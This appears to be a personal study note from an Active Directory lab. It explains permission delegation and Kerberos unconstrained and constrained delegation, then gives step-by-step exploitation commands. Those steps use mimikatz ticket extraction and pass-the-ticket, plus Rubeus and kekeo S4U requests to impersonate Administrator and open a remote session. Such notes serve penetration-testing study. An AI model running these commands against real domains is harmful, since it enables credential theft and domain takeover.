## permission delegation
we can delegate the permission to force change a user's password to the Helpdesk team, meaning they now have a delegated privilege for this specific function
- Permission Delegation exploits are often referred to as ACL-based attacks
- AD allows administrators to configure Access Control Entries (ACEs) that populates Discretionary Access Control Lists (DACLs), hence the name ACL-based attacks
- [Bloodhound documentation](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#) assists in explaining enumerated ACEs and how they can be exploited
## Kerberos Delegation
##### explain and example
The client wants to authenticate using Kerberos to the first server (Hop 1) and the first server needs to access resources on the second server (Hop 2) on behalf of the client. A common scenario is a user that access a frontend application that needs to modify resources on a database server.
![[Pasted image 20250314212242.png]]
when the client sends a TGS to access the first server with unconstrained delegation they will attach their TGT in the same request. In this way the first hop server has a TGT for the client’s account, and can request a TGS to access the second hop server on their behalf.
##### risk
if an attacker compromises a server with unconstrained delegation enabled, they can extract TGTs of the accounts that have attempted a connection to the first hop server.
##### Constrained Kerberos Delegation
in above attack the TGT for the user can act as the user, access any resource the user have access to, so  Microsoft introduced Constrained Delegation in 2003. Constrained Delegation restricts what services an account can be delegated to, limiting exposure if an account is compromised. The following are examples of services that can be configured for delegation: HTTP,  CIFS , LDAP, HOST, MSSQL
#### exploit unconstrained delegation
1. find machines computer objects with the property `TrustedForDelegation`
	```powershell
	Get-ADComputer -Filter {TrustedForDelegation -eq $true -and primarygroupid -eq 515} -Properties trustedfordelegation,serviceprincipalname,description
	```
2. On the computer with kerberos delegation rights, run mimikatz to extract TGTs: 
	1. list tickets: `sekurlsa::tickets` 
	2. force the user to auth to your machine if the token u want to fond, here's examples:
		[exploit unconstrained delegation using SpoolSample](https://medium.com/@riccardo.ancarani94/exploiting-unconstrained-delegation-a81eabbd6976 )
	3. export it`tickets /export` 
3. load into memory `kerberos::ptt`
4. validate and get remote access, `klist;Enter-PSSession <name>`
https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation
https://web.archive.org/web/20190709194357/https://www.harmj0y.net/blog/activedirectory/a-case-study-in-wagging-the-dog-computer-takeover/
#### exploit constrained delegation
Constrained delegation allows a service to **delegate user credentials to specific services (SPNs)**. Attackers abuse this to impersonate users and access allowed services (e.g., WinRM, HTTP, MSSQL).
1. **Identify Accounts with Constrained Delegation**  
	Find user or computer accounts with `msDS-AllowedToDelegateTo` configured (allowed SPNs):
	```powershell
	# For users:
	Get-ADUser -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo  
	# For computers:
	Get-ADComputer -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo  
	```
2. **Obtain Credentials or a TGT for the Delegation Account**  
	Compromise the account (e.g., `svc_deleg`) that has constrained delegation rights. Use its credentials/hash to request a **TGT**:
	```powershell
	# Using Rubeus:
	Rubeus.exe asktgt /user:svc_deleg /domain:corp.local /rc4:<NTLM_HASH> /nowrap
	# or use kekeo
	kekeo # tgt::ask /user:svcIIS /domain:za.tryhackme.loc /password:Password1@
	```
3. **Impersonate a User via S4U2Self/S4U2Proxy**  
	Use the TGT to request a **Service Ticket (TGS)** for a target user (e.g., `Administrator`) to the allowed SPNs:
	```powershell
	Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:CIFS/THMSERVER1.corp.local /altservice:HTTP,WSMAN /tgt:<BASE64_TGT> /nowrap  
	# or use kekeo
	kekeo # tgs::s4u /tgt:TGT_svcIIS@....kirbi /user:t1_trevor.jones /service:http/THMSERVER1.za.tryhackme.loc
	```
4. **Inject the TGS and Access the Service**  
	Load the stolen TGS into memory:
	```powershell
	Rubeus.exe ptt /ticket:<BASE64_TGS>  
	# Or with mimikatz:
	kerberos::ptt CIFS_THMSERVER1.kirbi  
	```
	Access the target service:
	```powershell
	klist  # Verify injected tickets
	Enter-PSSession -ComputerName THMSERVER1.corp.local  # WinRM access
	```
## 